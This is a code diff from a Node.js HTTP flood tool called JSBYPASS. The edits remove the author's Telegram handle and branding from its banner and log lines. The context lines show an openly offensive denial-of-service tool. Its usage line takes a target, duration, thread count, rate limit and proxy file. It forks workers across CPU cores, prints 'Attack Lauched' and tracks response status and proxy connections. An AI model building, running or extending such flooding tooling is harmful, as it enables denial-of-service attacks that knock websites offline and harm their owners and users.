@@ -90,7 +90,7 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.log(`
 
 
-     ${chalk.magenta('Telegram:')} t.me/bixd08 | ${chalk.magenta('JSBYPASS')} - ${chalk.magenta('Update')}: 31/08/2025
+     ${chalk.magenta('Telegram:')} t.me/ | ${chalk.magenta('JSBYPASS')} - ${chalk.magenta('Update')}: 31/08/2025
      ${chalk.blue('Usage:')}
         node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> [ Options ]
      ${chalk.red('Example:')}
@@ -991,7 +991,7 @@ if (cluster.isMaster) {
     const workers = {};
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
-    console.log(`Attack Lauched @bixd08`);
+    console.log(`Attack Lauched `);
 
     cluster.on('exit', (worker) => {
         cluster.fork({ core: worker.id % os.cpus().length });
@@ -1023,7 +1023,7 @@ if (cluster.isMaster) {
                 .map(([status, count]) => colorizeStatus(status, count))
                 .join(', ');
             console.clear();
-            console.log(`[${chalk.magenta.bold('JSBYPASS/BixD')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
+            console.log(`[${chalk.magenta.bold('JSBYPASS/')}] | Date: [${chalk.blue.bold(new Date().toLocaleString('en-US'))}] | Status: [${statusString}] | ProxyConnect: [${chalk.cyan.bold(totalConnections)}]`);
             proxyConnections = 0;
         }, 1000);
     }
